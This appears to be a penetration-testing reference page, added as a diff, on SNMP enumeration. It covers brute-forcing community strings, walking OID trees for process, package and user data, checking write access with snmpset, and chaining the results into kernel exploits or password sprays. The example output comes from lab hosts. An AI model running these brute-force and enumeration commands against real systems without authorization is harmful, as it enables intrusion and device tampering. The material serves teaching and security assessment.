@@ -1,0 +1,363 @@
+---
+title: SNMP
+description: Simple Network Management Protocol enumeration - community string brute-force, OID-tree walking, internal information extraction via SNMPv1/v2c, and the snmpwalk / onesixtyone / braa tool chain on UDP 161.
+mitre: [T1046, T1016, T1049, T1082, T1018]
+d3fend: [D3-NTA]
+impact: [InternalAccess, CredentialTheft]
+sidebar:
+  order: 8
+  label: SNMP
+---
+
+## TL;DR
+
+SNMP is a network-device monitoring protocol. Versions 1 and 2c authenticate with a plaintext "community string" - basically a shared password - that's often left at the default `public`. When SNMPv1/v2c is exposed with a guessable community string, you get a read-out of the entire device's state: installed packages, running processes, network config, user accounts, sometimes more.
+
+```
+# 1. UDP scan (SNMP is UDP, won't show on TCP scans)
+sudo nmap -sU -p161 <target>
+
+# 2. Brute-force community string
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target>
+
+# 3. Walk the entire OID tree with the discovered community
+snmpwalk -v2c -c public <target>
+
+# 4. Faster brute-force walk
+braa public@<target>:.1.3.6.*
+
+# 5. Specific high-value OIDs
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2     # running processes
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2     # installed software
+snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25      # Windows users
+```
+
+Success indicator: `snmpwalk` returns OID/value pairs from the target (anything past the device basic-info OIDs). Common community string `public` is the highest-incidence finding.
+
+## Protocol overview
+
+SNMP queries devices for management information. It supports both reads ("what's the CPU temperature?") and writes ("set this configuration value"), plus an unsolicited "trap" channel for the device to push events to a manager.
+
+| Port | Purpose | Transport |
+| --- | --- | --- |
+| **UDP 161** | Manager → agent queries (most operator work happens here) | UDP |
+| **UDP 162** | Agent → manager unsolicited traps | UDP |
+
+UDP-based: the protocol is connectionless, you fire requests at the device and it responds (or doesn't). Won't show on TCP port scans - must explicitly `-sU` to see it.
+
+### Version differences
+
+| Version | Year | Auth | Encryption | State |
+| --- | --- | --- | --- | --- |
+| **SNMPv1** | 1988 | Community string (plaintext) | None | Still in deprecated deployments, primary target for guessable-community attacks |
+| **SNMPv2c** | 1996 | Community string (plaintext) | None | Most common version actually deployed |
+| **SNMPv3** | 1998 | Username + password (HMAC) | Optional (DES/AES) | Best-practice modern deployment |
+
+For operator purposes: v1 and v2c are functionally equivalent - both use community strings, both transmit them in cleartext. v3 is a different beast with proper authentication and optional encryption. This page focuses on v1/v2c because they're far more common and far more vulnerable.
+
+### MIB and OIDs
+
+| Term | What it means |
+| --- | --- |
+| **MIB** (Management Information Base) | A text file describing the queryable objects on a device, in a tree structure |
+| **OID** (Object Identifier) | A specific node in the MIB tree, addressed by a dot-separated string of integers: `1.3.6.1.2.1.1.1.0` |
+| **ASN.1** | The notation MIBs are written in |
+
+The OID tree is hierarchical:
+
+```
+1                       iso
+1.3                     identified-organization
+1.3.6                   dod
+1.3.6.1                 internet
+1.3.6.1.2               mgmt
+1.3.6.1.2.1             mib-2
+1.3.6.1.2.1.1           system
+1.3.6.1.2.1.1.1.0       sysDescr (system description, full)
+1.3.6.1.2.1.1.4.0       sysContact (admin contact email)
+1.3.6.1.2.1.1.5.0       sysName (hostname)
+```
+
+You don't need to memorize the tree. `snmpwalk` walks it for you; the [OID registry](https://www.alvestrand.no/objectid/) is a searchable index.
+
+High-value OID subtrees:
+
+| OID | Contents |
+| --- | --- |
+| `1.3.6.1.2.1.1` | System info - hostname, OS description, contact, location, uptime |
+| `1.3.6.1.2.1.2.2` | Network interfaces |
+| `1.3.6.1.2.1.4.20` | IP addresses |
+| `1.3.6.1.2.1.6.13` | TCP connection table |
+| `1.3.6.1.2.1.25.1` | Host resources - uptime, RAM, mounted filesystems |
+| `1.3.6.1.2.1.25.4.2.1` | Running processes |
+| `1.3.6.1.2.1.25.6.3.1.2` | Installed software packages |
+| `1.3.6.1.4.1.77.1.2.25` | (Windows) local user accounts |
+| `1.3.6.1.4.1.77.1.4.1` | (Windows) primary domain |
+| `1.3.6.1.4.1.77.1.2.27` | (Windows) shared printers |
+
+## Default configuration - Net-SNMP
+
+The Linux Net-SNMP daemon's config is at `/etc/snmp/snmpd.conf`. Filtered to non-comments:
+
+```
+sysLocation    Sitting on the Dock of the Bay
+sysContact     Me <me@example.org>
+sysServices    72
+master         agentx
+agentaddress   127.0.0.1,[::1]
+view           systemonly  included   .1.3.6.1.2.1.1
+view           systemonly  included   .1.3.6.1.2.1.25.1
+rocommunity    public default -V systemonly
+rocommunity6   public default -V systemonly
+rouser         authPrivUser authpriv -V systemonly
+```
+
+Settings to recognize:
+
+- `agentaddress` - which interface SNMP listens on (`127.0.0.1` = localhost only, `0.0.0.0` = all interfaces)
+- `view` definitions - subsets of the OID tree exposed to specific communities
+- `rocommunity <string>` - read-only access for the named community
+- `rwcommunity <string>` - read+write access for the named community
+- `rouser` / `rwuser` - SNMPv3 equivalents, named user instead of community
+
+By default, Net-SNMP exposes only a narrow `systemonly` view (basic system info + host resources) over the `public` community to localhost only. Real deployments often deviate to expose more, sometimes carelessly.
+
+## Dangerous settings
+
+| Setting | Why it's bad |
+| --- | --- |
+| `agentaddress 0.0.0.0` (or `udp:161` without bind-IP) | Listening on all interfaces - accessible from external networks |
+| `rocommunity public` (or any weak string) on a publicly accessible interface | Anyone who guesses `public` reads the whole tree |
+| `rwcommunity <weak> <wide-source>` | Read+write access from a wide IP range - attacker can change device config |
+| `view full included .1` | Wide-open view definition - the community has access to everything, not just `systemonly` |
+| Multiple `rocommunity` lines | Multiple community strings, each a potential weak point |
+| `rwuser noauth` | SNMPv3 user with no authentication required |
+| `rocommunity public 0.0.0.0/0` | The classic - `public` accessible from anywhere |
+
+A misconfigured snmpd typically looks like this in the wild:
+
+```
+agentaddress 0.0.0.0
+rocommunity public
+view all included .1
+```
+
+That's: listen on all interfaces, accept `public`, expose the entire OID tree. Walking it yields the entire device state.
+
+## Footprinting commands
+
+### Port discovery
+
+```shell
+sudo nmap -sU -p161 10.129.14.128
+```
+
+```
+PORT    STATE  SERVICE
+161/udp open|filtered snmp
+```
+
+UDP port states are tricky:
+
+- **`open|filtered`** - nmap can't tell. Could be open with a silent service, could be filtered. Almost always means "try snmpwalk and see if you get a response."
+- **`open`** - nmap got a positive UDP response back, confirming an SNMP service.
+- **`filtered`** - ICMP "port unreachable" returned, meaning a firewall is dropping.
+- **`closed`** - TCP-RST equivalent for UDP, very rare.
+
+The `--script snmp-info` NSE script can probe further:
+
+```shell
+sudo nmap -sU -p161 --script snmp-info <target>
+```
+
+### Community string brute-force
+
+`onesixtyone` is purpose-built for this - fast, asynchronous, designed for sweeping many IPs with many community-string candidates:
+
+```shell
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
+```
+
+```
+Scanning 1 hosts, 3220 communities
+10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP ... x86_64
+```
+
+The `[public]` brackets mean that's the community string that worked, followed by the `sysDescr` (default OID `1.3.6.1.2.1.1.1.0`) - the device's self-description.
+
+The default wordlist (`snmp.txt` in SecLists) covers thousands of common community strings. For broader coverage, build a custom wordlist from the target's hostname patterns. Companies often name community strings after the hostname, the location, or the device role:
+
+```
+public
+private
+community
+manager
+admin
+<companyname>
+<companyname>-snmp
+<companyname>-ro
+<companyname>-rw
+<location>-<role>     # e.g., dc1-router
+```
+
+Tools like [`crunch`](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) can generate permutation-heavy lists, but most real-world community strings are short and memorable - admins picked them by hand.
+
+### Full OID tree walk
+
+Once you have a working community string:
+
+```shell
+snmpwalk -v2c -c public 10.129.14.128
+```
+
+Output is verbose. Example excerpts:
+
+```
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 ... x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34
+iso.3.6.1.2.1.1.4.0 = STRING: "mrb3n@inlanefreight.htb"
+iso.3.6.1.2.1.1.5.0 = STRING: "htb"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=9a6a5c52-... ro quiet splash"
+```
+
+What this leaks:
+
+- Exact kernel version (`5.11.0-34-generic`) and distribution (`Ubuntu 20.04`)
+- Admin contact email (`mrb3n@inlanefreight.htb`)
+- Hostname (`htb`)
+- Boot command line, including UUID of the root filesystem
+- Patch level - match the kernel to known privilege-escalation exploits
+
+Further down the walk:
+
+```
+iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: "printer-driver-sag-gdi_0.1-7_all"
+iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: "proftpd-basic_1.3.6c-2_amd64"
+iso.3.6.1.2.1.25.6.3.1.2.1239 = STRING: "pulseaudio_1:13.99.1-1ubuntu3.12_amd64"
+iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: "python3_3.8.2-0ubuntu2_amd64"
+```
+
+That's the full installed-package list with versions. Cross-reference against vulnerability databases for known CVEs in any package.
+
+### Walking specific OIDs
+
+To narrow the walk to interesting subtrees:
+
+```shell
+# System info
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1
+
+# Network interfaces
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.2
+
+# IP addresses bound to this host
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.20
+
+# Running processes
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2
+
+# Installed software
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2
+
+# Active TCP connections
+snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13
+
+# Windows: local users
+snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25
+
+# Windows: primary domain
+snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.4.1
+
+# Cisco: running config (if accessible)
+snmpwalk -v2c -c public <target> 1.3.6.1.4.1.9.9.96.1.1.1.1.2
+```
+
+### Faster: braa
+
+`snmpwalk` queries one OID at a time, walking sequentially. `braa` is asynchronous - fires many SNMP requests in parallel - and is dramatically faster for full-tree dumps.
+
+```shell
+braa public@10.129.14.128:.1.3.6.*
+```
+
+```
+10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic ... x86_64
+10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
+10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
+10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
+10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
+...
+```
+
+Output is one-line-per-result, easy to grep:
+
+```shell
+braa public@10.129.14.128:.1.3.6.* | grep -i "process\|user\|password\|admin"
+```
+
+### Verifying writability - if `rw` is enabled
+
+When `rwcommunity` is set, you can change device values via `snmpset`. This is mostly relevant for network devices (routers, switches) where SNMP-SET can:
+
+- Change the running config
+- Reboot the device
+- Modify routing tables
+- Disable interfaces
+
+```shell
+snmpset -v2c -c private <target> 1.3.6.1.2.1.1.5.0 s "owned"
+```
+
+This sets the hostname (`sysName`) to "owned" - a benign test that confirms write access without breaking anything. **Do not** run write operations against production gear without explicit permission; one wrong OID can take down a router.
+
+### SNMPv3 enumeration
+
+If you find SNMPv3, brute-force is much slower (HMAC verification) but possible:
+
+```shell
+# Identify v3 users (engine ID enumeration is sometimes possible)
+snmpwalk -v3 -u testuser -l noAuthNoPriv <target>
+```
+
+Most v3 deployments require both auth and priv (encryption). Without valid credentials, you don't get further than the engine-ID response. Brute-forcing v3 with `hydra` is possible but slow and noisy.
+
+## Common chained workflows
+
+**Community string → installed packages → kernel exploit:**
+1. `onesixtyone` finds `public`
+2. `snmpwalk` reveals kernel version and patch level
+3. Cross-reference for unpatched kernel exploits
+4. After gaining a foothold elsewhere, the kernel exploit gets root
+
+**Community string → user list → password spray:**
+1. Walk the user-accounts OID subtree (Windows targets especially)
+2. Extracted user list goes into a password-spray against RDP/SMB
+3. Hits give shell
+
+**Community string → running processes → finger services to target:**
+1. Process list shows what's actually running
+2. Compare against open TCP ports - sometimes processes listen on internal-only interfaces
+3. Use SSRF or other paths to reach those internal services
+
+**Read community → write community guess:**
+1. Once you've guessed `public` (read), try `private` (write) - many admins set both, just changing one letter
+2. Verify write access non-destructively
+3. Now you can modify device config - for routers/switches, that's a serious finding
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| UDP scan | `sudo nmap -sU -p161 <target>` |
+| Community brute | `onesixtyone -c snmp.txt <target>` |
+| Full walk | `snmpwalk -v2c -c public <target>` |
+| Specific OID | `snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25` |
+| Fast walk | `braa public@<target>:.1.3.6.*` |
+| Get one OID | `snmpget -v2c -c public <target> 1.3.6.1.2.1.1.5.0` |
+| Set one OID (rw) | `snmpset -v2c -c private <target> <OID> s "value"` |
+| System info | OID `1.3.6.1.2.1.1` |
+| Running processes | OID `1.3.6.1.2.1.25.4.2` |
+| Installed software | OID `1.3.6.1.2.1.25.6.3.1.2` |
+| Windows users | OID `1.3.6.1.4.1.77.1.2.25` |
